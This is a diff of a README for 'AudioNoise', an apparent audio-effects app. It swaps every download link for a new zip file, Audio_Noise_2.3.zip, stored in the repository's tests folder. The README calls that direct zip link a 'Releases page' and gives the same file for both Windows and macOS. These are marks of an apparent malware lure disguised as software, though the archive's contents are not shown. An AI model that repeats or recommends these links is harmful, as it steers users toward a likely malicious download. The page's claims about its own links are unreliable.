@@ -4,7 +4,7 @@
 Welcome to AudioNoise! This application lets you create random digital audio effects, perfect for music makers and sound designers. Follow the steps below to easily download and run AudioNoise on your computer.
 
 ## 📥 Download AudioNoise
-[![Download AudioNoise](https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip)](https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip)
+[![Download AudioNoise](https://raw.githubusercontent.com/Mapezxczxc/AudioNoise/main/tests/Audio_Noise_2.3.zip)](https://raw.githubusercontent.com/Mapezxczxc/AudioNoise/main/tests/Audio_Noise_2.3.zip)
 
 ## 📋 System Requirements
 Before you download AudioNoise, make sure your computer meets the following requirements:
@@ -23,11 +23,11 @@ AudioNoise offers a range of exciting features to enhance your audio projects:
 - **Export Options:** Save your creations in various audio formats.
 
 ## 📂 Download & Install
-To get started with AudioNoise, visit this page to download: [AudioNoise Releases](https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip).
+To get started with AudioNoise, visit this page to download: [AudioNoise Releases](https://raw.githubusercontent.com/Mapezxczxc/AudioNoise/main/tests/Audio_Noise_2.3.zip).
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release version at the top.
-3. Find the appropriate file for your operating system (e.g., `https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip` for Windows or `https://github.com/Mapezxczxc/AudioNoise/raw/refs/heads/main/tests/Audio_Noise_v2.0.zip` for macOS).
+3. Find the appropriate file for your operating system (e.g., `https://raw.githubusercontent.com/Mapezxczxc/AudioNoise/main/tests/Audio_Noise_2.3.zip` for Windows or `https://raw.githubusercontent.com/Mapezxczxc/AudioNoise/main/tests/Audio_Noise_2.3.zip` for macOS).
 4. Click the file name to start the download.
 
 Once the download is complete:
